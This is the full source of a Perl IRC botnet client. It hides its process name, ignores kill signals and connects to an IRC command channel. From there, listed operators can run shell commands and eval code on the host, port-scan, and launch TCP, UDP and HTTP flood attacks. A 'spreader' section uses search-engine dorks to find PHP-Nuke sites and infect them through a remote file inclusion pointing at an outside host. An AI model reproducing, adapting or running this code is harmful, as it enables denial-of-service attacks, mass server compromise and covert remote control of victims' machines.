#!/usr/bin/perl
# Morgan is a lamer !!! 
# udpflood wwww.santogoogle.com :)

my $processo = '[httpdx]';
my $linas_max='5';
my $sleep='5';
my @adms=("SecretDreams");
my @hostauth=("IknowUrDream.FullNetwork");
my @canais=("#l33t");
my $pwned="/tmp/horderd";
my $nick='vishnu-';
my $ircname = 'Sdre';
chop (my $realname = 'id');
$servidor='irc.fullnetwork.org' unless $servidor;
my $porta='6667';

my $VERSAO = '0.2';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);



our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}
 
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!say)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         } 
       }
	}
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4; 
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}


sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","23","25","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080");
             my (@aberta, %porta_banner);
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Scanning ".$1." for open ports.");     
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Open port(s): @aberta");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[SCAN]\002 No open ports found"); 
             }
           }
           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Attacking ".$1.":".$2." for ".$3." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($3>$cur_time){
             $cur_time = time - $itime;
	     &tcpflooder("$1","$2","$3");
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Finished with attacking ".$1.":".$2.".");
           }
           if ($funcarg =~ /^google\s+(\d+)\s+(.*)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Scanning for unpatched phpnuke for ".$1." seconds.");
	     srand;
	     my $itime = time;
	     my ($cur_time);
	     my ($exploited);

	     $boturl=$2;
             $cur_time = time - $itime;
	     $exploited = 0;
		while($1>$cur_time){
		    $cur_time = time - $itime;
		    @urls=fetch();
			foreach $url (@urls) {
			$cur_time = time - $itime;
			if ($url !~ /.php/) {next;$cur_time = time - $itime;}
			$url =~ s/(.*\/.php\?[t|p]=[0-9]+).*/$1/;
			$host[0] = $url;
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SecretDreams]\002 " .$url. ".");
			if($host[0] =~ /\//){
			($host[1],$host[2])=split(/\//,$host[0]);
			}
			my $tmp = "";
			my @h0st = split(/\//, $url);
			foreach my $val (@h0st) {
				if($val =~ /modules.php/){
					
				}
				else {
				$tmp .=$val."/";
				}
				
			}
			
			$url =$tmp."modules/Forums/admin/admin_styles.php?phpbb_root_path=http://www.phptester.org/full/";

			
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[exploiting]\002 " .$url);
			
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[EXPLOITING]\002 ".$host[0]." - ".$host[1]." - ".$host[2]);
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SecretDreams]\002 " .$url);
			#$url = $host[1]."/protection.php?action=logout&siteurl=http://www.phptester.org/common.php";
			#sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SecretDreams]\002 " .$url);
			#$page = "juaxked";
			
			$page = http_query($url);
			if ( $page =~ /juaxked/ ){
#			    $page = http_query($url);
			    $exploited = $exploited + 1;
			   # sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[0WN3D]\002 " .$url. ".");
			}
		    }
		}
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Exploited ".$exploited." boxes in ".$1." seconds.");
           }
           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Attacking ".$1.":80 for ".$2." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($2>$cur_time){
             $cur_time = time - $itime;
	     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	     close($socket);
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Finished with attacking ".$1.".");
           }
           if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Attacking ".$1." with ".$2." Kb packets for ".$3." seconds.");
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Sended ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");

           }
           exit;
       }
  }
}
 
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   } 
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}

sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "No such file or directory");
    return;
  } 
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}

sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
  
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}  
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}

#Spreader

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 50;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

#my @str=("(%22PHPQuotes%22+%7C%7C+%22PHPFanBase%22+%7C%7C+%22PHPClique%22)+%22%A9+Copyright+Sasha%22+%22All+Rights+Reserved.%22+(+inurl%3A%22login.php%22+%7C%7C+inurl%3A%22admin.php%22+)",
#"(%22PHPQuotes%22+%7C%7C+%22PHPFanBase%22+%7C%7C+%22PHPClique%22)+%22%A9+Copyright+Sasha%22+%22All+Rights+Reserved.%22+(+inurl%3A%22login.php%22+%7C%7C+inurl%3A%22admin.php%22+)");
#http://www.google.es/custom?q=intitle:uruguay&num=60&start=0

my @str=("Powered+by+PHP-Nuke",
"inurl:%22.ar/modules.php?%22",
"inurl:%22.cc/modules.php?%22",
"inurl:%22.com/modules.php?%22",
"inurl:%22.net/modules.php?%22",
"inurl:%22.org/modules.php?%22",
"inurl:%22.mil/modules.php?%22",
"inurl:%22.gov/modules.php?%22",
"inurl:%22.aero/modules.php?%22",
"inurl:%22.info/modules.php?%22",
"inurl:%22.biz/modules.php?%22",
"inurl:%22.name/modules.php?%22",
"inurl:%22.uy/modules.php?%22",
"inurl:%22.cl/modules.php?%22",
"inurl:%22.co/modules.php?%22",
"inurl:%22.ve/modules.php?%22",
"inurl:%22.pe/modules.php?%22",
"inurl:%22.ec/modules.php?%22",
"inurl:%22.py/modules.php?%22",
"inurl:%22.bo/modules.php?%22",
"inurl:%22.pr/modules.php?%22",
"inurl:%22.cu/modules.php?%22",
"inurl:%22.mx/modules.php?%22",
"inurl:%22.ca/modules.php?%22",
"inurl:%22.us/modules.php?%22",
"inurl:%22.ni/modules.php?%22",
"inurl:%22.br/modules.php?%22",
"inurl:%22.al/modules.php?%22",
"inurl:%22.de/modules.php?%22",
"inurl:%22.ch/modules.php?%22",
"inurl:%22.it/modules.php?%22",
"inurl:%22.fr/modules.php?%22",
"inurl:%22.pt/modules.php?%22",
"inurl:%22.es/modules.php?%22",
"inurl:%22.nl/modules.php?%22",
"inurl:%22.cr/modules.php?%22",
"inurl:%22.cy/modules.php?%22",
"inurl:%22.be/modules.php?%22",
"inurl:%22.dk/modules.php?%22",
"inurl:%22.se/modules.php?%22",
"inurl:%22.su/modules.php?%22",
"inurl:%22.sk/modules.php?%22",
"inurl:%22.tk/modules.php?%22",
"inurl:%22.ro/modules.php?%22",
"inurl:%22.ru/modules.php?%22",
"inurl:%22.nz/modules.php?%22",
"inurl:%22.au/modules.php?%22",
"inurl:%22.cx/modules.php?%22",
"inurl:%22.cz/modules.php?%22",
"inurl:%22.tr/modules.php?%22",
"inurl:%22.za/modules.php?%22",
"inurl:%22.sa/modules.php?%22",
"inurl:%22.ee/modules.php?%22",
"inurl:%22.hk/modules.php?%22",
"inurl:%22.tw/modules.php?%22",
"inurl:%22.jp/modules.php?%22",
"inurl:%22.th/modules.php?%22",
"inurl:%22.cn/modules.php?%22",
"inurl:%22.kr/modules.php?%22",
"inurl:%22.pl/modules.php?%22",
"inurl:%22.uk/modules.php?%22",
"inurl:%22.lx/modules.php?%22",
"inurl:%22.edu/modules.php?%22",
"inurl:%22.am/modules.php?%22",
"inurl:%22.to/modules.php?%22",
"inurl:%22.tv/modules.php?%22",
"inurl:%22.ua/modules.php?%22",
"inurl:%22.gr/modules.php?%22");


    my $query="www.google.com/custom?q=";
    $query.=$str[(rand(scalar(@str)))];
    $query.="&num=$n&start=$s";
    my @lst=();
	#sendraw("privmsg #juax0r# :googleando: ".$query);
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
	if ($1 !~ m/google|cache|translate/){
	    push (@lst,$1);
	}
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
	local $SIG{ALRM} = sub { die "1";};
	alarm 10;
	my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
	print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
	my @r = <$sock>;
	$page="@r";
	alarm 0;
	close($sock);
    };    
    return $page;

}

